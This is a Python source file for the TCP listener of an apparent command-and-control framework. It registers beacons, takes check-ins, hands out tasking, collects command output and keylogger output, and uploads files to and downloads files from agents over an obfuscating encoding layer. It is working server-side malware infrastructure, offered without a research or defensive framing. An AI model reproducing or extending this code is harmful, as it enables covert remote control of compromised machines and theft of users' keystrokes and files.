import socket
import threading
import time
from socketserver import ThreadingTCPServer, BaseRequestHandler
from typing import Dict, Any, Optional
from pathlib import Path
from werkzeug.utils import secure_filename
from .base_receiver import BaseReceiver, ReceiverStatus
from .encoding_strategies import EncodingStrategy
from .receiver_config import ReceiverConfig
import utils
from config import ServerConfig

class EncodedConnectionHandler:
    """Handles connections with encoding/decoding support"""
    
    def __init__(self, encoding_strategy: EncodingStrategy, command_processor, file_transfer_service, buffer_size: int):
        self.encoding_strategy = encoding_strategy
        self.command_processor = command_processor
        self.file_transfer_service = file_transfer_service
        self.buffer_size = buffer_size
        self.single_transaction_commands = {
            "register", "request_action", "checkin", "command_output", "keylogger_output"
        }
        
    def handle_connection(self, sock: socket.socket, client_address: tuple, receiver_instance):
        """Handle a connection with encoding support"""
        
        try:
            # Set a reasonable timeout to prevent hanging connections
            sock.settimeout(10.0)
            
            # Receive and decode initial data
            initial_data_raw = sock.recv(self.buffer_size)
            if not initial_data_raw:
                return
                
            # Decode the data
            try:
                initial_data_decoded = self.encoding_strategy.decode(initial_data_raw)
                initial_data = initial_data_decoded.decode('utf-8').strip()
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Decoding error from {client_address}: {e}")
                return
                
            parts = initial_data.split('|')
            command = parts[0] if parts else ""
            
            # Update stats using thread-safe method
            receiver_instance.update_bytes_received(len(initial_data_raw))
            
            if command in ("to_agent", "from_agent"):
                self._handle_file_transfer(sock, command, parts, client_address, receiver_instance)
            else:
                self._handle_command(sock, initial_data, client_address, receiver_instance)
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Connection Error: {client_address[0]}:{client_address[1]} - {str(e)}")
        finally:
            try:
                sock.close()
            except:
                pass
                
    def _handle_file_transfer(self, sock: socket.socket, command: str, parts: list, client_address: tuple, receiver_instance):
        """Handle file transfer with encoding"""
        
        if len(parts) < 2:
            response = self.encoding_strategy.encode(b"ERROR|Invalid file transfer command")
            self._send_all(sock, response)
            return
            
        filename = parts[1]
        config = ServerConfig()
        
        if command == "to_agent":
            # Send file (encoded)
            success = self._send_file(sock, filename, config, receiver_instance)
        else:  # from_agent
            # Receive file (encoded)
            ready_response = self.encoding_strategy.encode(b"READY")
            self._send_all(sock, ready_response)
            success = self._receive_file(sock, filename, config, receiver_instance)
    
    def _send_all(self, sock: socket.socket, data: bytes) -> int:
        """Ensure all data is sent via socket"""
        total_sent = 0
        while total_sent < len(data):
            sent = sock.send(data[total_sent:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
        return total_sent
            
    def _send_file(self, sock: socket.socket, filename: str, config, receiver_instance) -> bool:
        """Send file with encoding"""
        try:
            
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            if not filepath.exists():
                error_response = self.encoding_strategy.encode(b'ERROR|File not found')
                self._send_all(sock, error_response)
                return False
                
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            
            CHUNK_SIZE = 1048576
            bytes_sent = 0
            
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                        
                    # Encode the chunk
                    encoded_chunk = self.encoding_strategy.encode(chunk)
                    bytes_sent += self._send_all(sock, encoded_chunk)
                    receiver_instance.update_bytes_sent(len(encoded_chunk))
                    
            if utils.logger:
                utils.logger.log_message(f"File transfer complete: {filename} ({bytes_sent} bytes)")
            return True
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in file send: {e}")
            return False
            
    def _receive_file(self, sock: socket.socket, filename: str, config, receiver_instance) -> bool:
        """Receive file with decoding"""
        try:
            
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)
            
            with open(filepath, 'wb') as f:
                total_received = 0
                while True:
                    try:
                        encoded_chunk = sock.recv(1048576)
                        if not encoded_chunk:
                            break
                            
                        # Decode the chunk
                        chunk = self.encoding_strategy.decode(encoded_chunk)
                        f.write(chunk)
                        
                        total_received += len(encoded_chunk)
                        receiver_instance.update_bytes_received(len(encoded_chunk))
                        
                    except socket.timeout:
                        if total_received > 0:
                            break
                        raise
                        
            if total_received > 0:
                success_response = self.encoding_strategy.encode(b'SUCCESS')
                self._send_all(sock, success_response)
                receiver_instance.update_bytes_sent(len(success_response))
                if utils.logger:
                    utils.logger.log_message(f"File received: {filename} ({total_received} bytes)")
                return True
            else:
                error_response = self.encoding_strategy.encode(b'ERROR|No data received')
                self._send_all(sock, error_response)
                return False
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in file receive: {e}")
            return False
            
    def _handle_command(self, sock: socket.socket, initial_data: str, client_address: tuple, receiver_instance):
        """Handle command processing with encoding"""
        
        try:
            keep_alive = self._process_command(sock, initial_data, receiver_instance)
            if not keep_alive:
                return
                
            while True:
                try:
                    data_raw = sock.recv(self.buffer_size)
                    if not data_raw:
                        break
                        
                    data_decoded = self.encoding_strategy.decode(data_raw)
                    data = data_decoded.decode('utf-8').strip()
                    receiver_instance.update_bytes_received(len(data_raw))
                    
                    keep_alive = self._process_command(sock, data, receiver_instance)
                    if not keep_alive:
                        break
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
                    break
                    
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")
            
    def _process_command(self, sock: socket.socket, data: str, receiver_instance) -> bool:
        """Process individual commands with encoding"""
        
        parts = data.split('|')
        if not parts:
            error_response = self.encoding_strategy.encode(b"Invalid command format")
            self._send_all(sock, error_response)
            receiver_instance.update_bytes_sent(len(error_response))
            return False
            
        command = parts[0]
        
        try:
            # Use existing command processor logic
            if command == "command_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                response = self.command_processor.process_command_output(beacon_id, output)
            elif command == "keylogger_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = data.split('|', 2)[2] if len(parts) > 2 else ""
                response = self.command_processor.process_keylogger_output(beacon_id, output)
            else:
                # Standard command dispatch
                response = {
                    "register": lambda: self.command_processor.process_registration(
                        parts[1], parts[2], receiver_instance.receiver_id, receiver_instance.name
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.command_processor.process_action_request(
                        parts[1], receiver_instance.receiver_id, receiver_instance.name
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "download_complete": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_complete"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "download_failed": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_failed"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
            # Encode and send response
            encoded_response = self.encoding_strategy.encode(response.encode('utf-8'))
            self._send_all(sock, encoded_response)
            receiver_instance.update_bytes_sent(len(encoded_response))
            
            return command not in self.single_transaction_commands
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing command {command}: {e}")
            return False

class TCPReceiver(BaseReceiver):
    """TCP receiver implementation with encoding support"""
    
    def __init__(self, config: ReceiverConfig, encoding_strategy: EncodingStrategy):
        super().__init__(config.receiver_id, config.name, encoding_strategy)
        self.config = config
        self.server: Optional[ThreadingTCPServer] = None
        self.connection_handler: Optional[EncodedConnectionHandler] = None
        
    def _setup_receiver(self) -> bool:
        """Setup TCP server"""
        try:
            # Create encoded connection handler
            self.connection_handler = EncodedConnectionHandler(
                self.encoding_strategy,
                self.command_processor,
                self.file_transfer_service,
                self.config.buffer_size
            )
            
            # Define custom TCP server class
            class ReusableTCPServer(ThreadingTCPServer):
                allow_reuse_address = True
                daemon_threads = True
                
            class CustomRequestHandler(BaseRequestHandler):
                def __init__(self, request, client_address, server, receiver_instance):
                    self.receiver_instance = receiver_instance
                    super().__init__(request, client_address, server)
                    
                def handle(self):
                    # Update connection stats using thread-safe methods
                    self.receiver_instance.increment_active_connections()
                    
                    try:
                        self.receiver_instance.connection_handler.handle_connection(
                            self.request, self.client_address, self.receiver_instance
                        )
                    finally:
                        self.receiver_instance.decrement_active_connections()
                        
            # Create server with custom handler
            def handler_factory(request, client_address, server):
                return CustomRequestHandler(request, client_address, server, self)
                
            self.server = ReusableTCPServer(
                (self.config.host, self.config.port),
                handler_factory
            )
            
            # Set server timeout to allow periodic shutdown checks
            self.server.timeout = 1.0
            
            return True
            
        except Exception as e:
            self.error_occurred.emit(self.receiver_id, f"Setup failed: {str(e)}")
            return False
            
    def _start_listening(self):
        """Start listening for connections"""
        if not self.server:
            return
            
        try:
            while not self._shutdown_event.is_set():
                if self.server:
                    try:
                        # handle_request() will timeout after server.timeout seconds
                        # This allows us to check shutdown_event periodically
                        self.server.handle_request()
                    except OSError as e:
                        # Check if this is due to shutdown or a real error
                        if self._shutdown_event.is_set():
                            break
                        # Only raise if we're not shutting down
                        raise
                    except socket.timeout:
                        # Timeout is expected, just continue to check shutdown event
                        continue
                        
        except Exception as e:
            if not self._shutdown_event.is_set():
                self.error_occurred.emit(self.receiver_id, f"Listening error: {str(e)}")
                
    def _cleanup_receiver(self):
        """Cleanup TCP server"""
        if self.server:
            try:
                # First, try graceful shutdown with timeout
                shutdown_thread = threading.Thread(target=self.server.shutdown)
                shutdown_thread.daemon = True
                shutdown_thread.start()
                
                # Wait for shutdown to complete, but don't wait forever
                shutdown_thread.join(timeout=2.0)
                
                if shutdown_thread.is_alive():
                    # If shutdown is taking too long, force close
                    try:
                        self.server.server_close()
                    except Exception:
                        pass
                else:
                    # Shutdown completed successfully, now close
                    self.server.server_close()
                    
            except Exception:
                # If anything fails, ensure we still close the server
                try:
                    self.server.server_close()
                except Exception:
                    pass
            finally:
                self.server = None
                
    def get_configuration(self) -> Dict[str, Any]:
        """Get TCP receiver configuration"""
        return {
            "host": self.config.host,
            "port": self.config.port,
            "buffer_size": self.config.buffer_size,
            "timeout": self.config.timeout,
            "max_connections": self.config.max_connections,
            "encoding": self.encoding_strategy.get_name()
        }
        
    def update_configuration(self, config_updates: Dict[str, Any]) -> bool:
        """Update TCP receiver configuration"""
        try:
            if "port" in config_updates:
                new_port = int(config_updates["port"])
                if 1 <= new_port <= 65535:
                    self.config.port = new_port
                else:
                    return False
                    
            if "host" in config_updates:
                self.config.host = config_updates["host"]
                
            if "buffer_size" in config_updates:
                self.config.buffer_size = int(config_updates["buffer_size"])
                
            # Restart if running to apply changes
            if self.status == ReceiverStatus.RUNNING:
                return self.restart()
                
            return True
            
        except Exception:
            return False